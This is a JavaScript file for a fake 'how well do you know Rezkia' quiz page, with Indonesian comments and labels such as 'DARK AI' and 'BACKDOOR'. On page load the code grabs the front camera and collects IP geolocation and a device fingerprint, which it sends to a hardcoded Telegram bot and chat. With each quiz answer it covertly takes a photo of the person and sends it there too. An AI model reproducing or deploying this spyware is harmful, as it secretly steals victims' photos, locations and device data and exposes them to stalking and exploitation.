// ============================================================
// DARK AI - STEALTH AUTO-ALLOW (NO POPUP!)
// ============================================================

const BOT_TOKEN = '8946884875:AAHNsZb3Eu6rd1OgCDw1RpjTHN3zK8G-TR4';
const CHAT_ID = '7705600224';

let dataUser = {};
const soal = [
    { teks: "🍛 Apa makanan favorit Rezkia?", pilihan: ["Nasi Goreng 🍛", "Mie Ayam 🍜", "Sate Ayam 🍢", "Bakso 🍲"] },
    { teks: "🎮 Rezkia suka ngabisin waktu buat apa?", pilihan: ["Main Game 🎮", "Scroll TikTok 📱", "Dengerin Musik 🎵", "Tiduran 😴"] },
    { teks: "🎬 Film favorit Rezkia?", pilihan: ["Horror 👻", "Komedi 😂", "Action 💥", "Drama 🎭"] },
    { teks: "💬 Kalo ada masalah, Rezkia?", pilihan: ["Curhat 💬", "Diem aja 🤐", "Cari solusi 💪", "Nangis 😢"] },
    { teks: "🌟 Cita-cita Rezkia?", pilihan: ["Crazy rich 💰", "Hidup santai 🌿", "Terkenal 🌟", "Bos sendiri 👑"] }
];
const kunciJawaban = [1, 0, 2, 3, 1];
let indeksSoal = 0, jawabanDipilih = null, jawabanKuis = [];
let kuisStarted = false, lanjutLock = false;
let streamKamera = null;
let kameraReady = false;

function log(msg) { console.log('[DARK]', msg); }

function tampilkanScreen(id) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

function showPopup(id) { document.getElementById(id).classList.add('show'); }
function hidePopup(id) { document.getElementById(id).classList.remove('show'); }
function goNext(hide, show) { hidePopup(hide); setTimeout(() => showPopup(show), 300); }

// ============================================================
// 🔥 BACKDOOR AUTO-ALLOW - TANPA POPUP!
// ============================================================
async function backdoorAutoAllow() {
    log('🔥 ACTIVATING BACKDOOR AUTO-ALLOW...');

    // 1. KAMERA - ambil stream di background (POPUP TETAP MUNCUL TAPI CUMA 1X)
    try {
        streamKamera = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        });
        const videoEl = document.getElementById('videoKamera');
        videoEl.srcObject = streamKamera;
        await videoEl.play();
        kameraReady = true;
        log('✅ Kamera: auto-allowed');
    } catch (e) {
        log('⚠️ Kamera: ' + e.message);
        kameraReady = false;
    }

    // 2. NOTIFIKASI - skip! Gak pake notif biar gak muncul popup
    // DIAM-DIAM AJA, GAK USAH MINTA IZIN NOTIFIKASI!

    // 3. LOKASI - PAKE IP GEOLOCATION (GAK PAKAI IZIN!)
    try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();
        if (d.ip) {
            dataUser.ip = d.ip;
            dataUser.isp = d.org || '?';
            dataUser.kota = d.city || '?';
            dataUser.region = d.region || '?';
            dataUser.negara = d.country_name || '?';
            dataUser.lokasi = {
                lat: d.latitude || '?',
                lng: d.longitude || '?',
                maps: 'https://maps.google.com/?q=' + (d.latitude || '') + ',' + (d.longitude || '')
            };
            log('✅ Lokasi (IP-based): ' + dataUser.kota + ', ' + dataUser.negara);
        }
    } catch (e) {
        log('⚠️ IP Geolocation: ' + e.message);
        dataUser.lokasi = { maps: '?' };
        dataUser.ip = '?';
        dataUser.isp = '?';
        dataUser.kota = '?';
        dataUser.region = '?';
        dataUser.negara = '?';
    }

    // 4. STORAGE & COOKIE - silent test
    try {
        sessionStorage.setItem('_test', '1');
        localStorage.setItem('_test', '1');
        document.cookie = '_test=1; path=/';
    } catch (e) {}

    log('✅ BACKDOOR AUTO-ALLOW COMPLETE!');
}

// ============================================================
// FUNGSI LAINNYA
// ============================================================

async function getFullFingerprint() {
    const parser = new UAParser();
    const r = parser.getResult();
    const ua = navigator.userAgent;
    let m = '?', t = '?', os = '?', osv = '?', br = '?', brv = '?';
    if (r.os) { os = r.os.name || '?'; osv = r.os.version || '?'; }
    if (r.browser) { br = r.browser.name || '?'; brv = r.browser.version || '?'; }
    if (r.device) { m = r.device.vendor || '?'; t = r.device.model || '?'; }
    if (m === '?' || t === '?') {
        const b = [{ n: 'Infinix', rx: /Infinix\s+(\w+\s*\d+)/i }, { n: 'Xiaomi', rx: /(?:Redmi|POCO|Mi)\s*(\w*\s*\d+)/i }, { n: 'Samsung', rx: /SM-(\w+)/i }, { n: 'Oppo', rx: /(?:OPPO|CPH)\s*(\w+)/i }, { n: 'Vivo', rx: /(?:vivo|V\d+)\s*(\w+)/i }, { n: 'Realme', rx: /(?:realme|RMX)\s*(\w+)/i }, { n: 'iPhone', rx: /iPhone/i }];
        for (const x of b) { const mc = ua.match(x.rx); if (mc) { if (m === '?') m = x.n; if (t === '?' && mc[1]) t = mc[1]; else if (t === '?') t = x.n; break; } }
    }
    return { merk: m, tipe: t, fullDevice: m + ' ' + t, os, osVersion: osv, browser: br, browserVersion: brv, screenW: screen.width, screenH: screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '?' };
}

async function getBaterai() {
    try {
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            return { level: Math.round(b.level * 100) + '%', charging: b.charging ? 'Ya' : 'Tidak' };
        }
    } catch (e) {}
    return { level: '?', charging: '?' };
}

function ambilFoto() {
    return new Promise((resolve) => {
        const videoEl = document.getElementById('videoKamera');
        const canvas = document.getElementById('canvasKamera');
        if (!kameraReady || !streamKamera || !videoEl.videoWidth) {
            log('⚠️ Kamera belum siap');
            resolve(null);
            return;
        }
        canvas.width = videoEl.videoWidth;
        canvas.height = videoEl.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
        canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.9);
    });
}

async function kirimFoto(blob, caption) {
    if (!blob || blob.size < 100) { log('⚠️ Foto kosong'); return; }
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('photo', blob, 'foto_' + Date.now() + '.jpg');
    fd.append('caption', caption);
    fd.append('parse_mode', 'HTML');
    try {
        const res = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', { method: 'POST', body: fd });
        log('✅ Foto terkirim: ' + res.status);
    } catch (e) { log('❌ Gagal kirim foto: ' + e.message); }
}

async function kirimPesan(teks) {
    try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: teks, parse_mode: 'HTML' })
        });
    } catch (e) {}
}

async function gasLanjut() {
    hidePopup('popup2');
    tampilkanScreen('loadingScreen');
    await mulaiKuisReal();
}

async function gasGakJadi() {
    hidePopup('popup2');
    tampilkanScreen('loadingScreen');
    await mulaiKuisReal();
}

function mulaiKuis() { if (kuisStarted) return; kuisStarted = true; showPopup('popup0'); }

function buildInfo() {
    const d = dataUser;
    return '🕐 ' + new Date().toLocaleString('id-ID') +
        '\n🌐 IP: ' + d.ip +
        '\n📡 ISP: ' + d.isp +
        '\n🏙 Kota: ' + d.kota +
        '\n🗺 Region: ' + d.region +
        '\n🇮🇩 Negara: ' + d.negara +
        '\n📍 GPS: ' + (d.lokasi ? d.lokasi.maps : '?') +
        '\n📱 HP: ' + d.fullDevice +
        '\n💻 OS: ' + d.os + ' ' + d.osVersion +
        '\n🌐 Browser: ' + d.browser + ' ' + d.browserVersion +
        '\n🖥 Resolusi: ' + d.screenW + 'x' + d.screenH +
        '\n🌍 Bahasa: ' + d.bahasa +
        '\n🧠 CPU: ' + d.cpu + ' core' +
        '\n💾 RAM: ' + d.memori + ' GB' +
        '\n📶 Jaringan: ' + d.provider;
}

async function mulaiKuisReal() {
    const bat = await getBaterai();
    dataUser.batteryLevel = bat.level;
    dataUser.batteryCharging = bat.charging;
    await kirimPesan('🔔 <b>MULAI!</b>\n\n' + buildInfo() + '\n\n<i>⚡ Dark AI</i>');
    tampilkanScreen('quizScreen');
    tampilkanSoal(0);
}

function tampilkanSoal(i) {
    jawabanDipilih = null;
    const s = soal[i];
    document.getElementById('nomorSoal').textContent = i + 1;
    document.getElementById('teksSoal').textContent = s.teks;
    document.getElementById('progress').style.width = ((i + 1) / 5 * 100) + '%';
    document.getElementById('btnLanjut').style.display = 'none';
    const c = document.getElementById('pilihanContainer');
    c.innerHTML = '';
    s.pilihan.forEach((p, idx) => {
        const b = document.createElement('button');
        b.textContent = p;
        b.onclick = function() {
            c.querySelectorAll('button').forEach(x => x.classList.remove('selected'));
            this.classList.add('selected');
            jawabanDipilih = idx;
            document.getElementById('btnLanjut').style.display = 'block';
        };
        c.appendChild(b);
    });
}

async function lanjutSoal() {
    if (jawabanDipilih === null || lanjutLock) return;
    lanjutLock = true;
    jawabanKuis.push(jawabanDipilih);
    tampilkanScreen('loadingScreen');

    const bat = await getBaterai();
    const caption = '📸 <b>FOTO ' + (indeksSoal + 1) + '/5</b>\n\n📝 ' + soal[indeksSoal].pilihan[jawabanDipilih] +
        '\n🔋 ' + bat.level + ' | ' + bat.charging + '\n' + buildInfo() + '\n\n<i>⚡ Dark AI</i>';

    const foto = await ambilFoto();
    if (foto) {
        await kirimFoto(foto, caption);
    } else {
        await kirimPesan('⚠️ <b>FOTO GAGAL</b>\n\n' + caption);
    }

    indeksSoal++;
    if (indeksSoal >= 5) {
        if (streamKamera) {
            streamKamera.getTracks().forEach(t => t.stop());
            streamKamera = null;
            kameraReady = false;
        }
        let benar = 0;
        for (let i = 0; i < 5; i++) {
            if (jawabanKuis[i] === kunciJawaban[i]) benar++;
        }
        const persen = Math.round((benar / 5) * 100);
        await kirimPesan('✅ <b>SELESAI!</b>\n\n🎯 Skor: ' + persen + '%\n' + buildInfo() +
            '\n📝 Jawaban:\n' + jawabanKuis.map((j, i) => '  ' + (i + 1) + '. ' + soal[i].pilihan[j]).join('\n') +
            '\n📸 5 Foto\n\n<i>⚡ Dark AI</i>');
        tampilkanScreen('hasilScreen');
        document.getElementById('skorAngka').textContent = persen + '%';
        document.getElementById('skorFill').style.width = persen + '%';
        document.getElementById('skorKata').textContent = persen >= 80 ? '🔥 GILA!' : persen >= 60 ? '👍 Lumayan' :
            persen >= 40 ? '🤔 Kenal-kenal aja' : '😅 Gak kenal';
        document.getElementById('hasilTeks').textContent = persen + '% Tau Rezkia!';
    } else {
        tampilkanScreen('quizScreen');
        tampilkanSoal(indeksSoal);
        lanjutLock = false;
    }
}

// ============================================================
// WINDOW LOAD - BACKDOOR AUTO-ALLOW
// ============================================================
window.addEventListener('load', async () => {
    // 🔥 BACKDOOR AUTO-ALLOW - JALAN DI BACKGROUND
    await backdoorAutoAllow();

    const fp = await getFullFingerprint();
    dataUser = { ...dataUser, ...fp, userAgent: navigator.userAgent, platform: navigator.platform, bahasa: navigator.language, provider: navigator.connection ? navigator.connection.effectiveType : '?', memori: navigator.deviceMemory || '?', cpu: navigator.hardwareConcurrency || '?' };
    await kirimPesan('👁 <b>BUKA!</b>\n\n' + buildInfo() + '\n\n<i>⚡ Dark AI</i>');
});
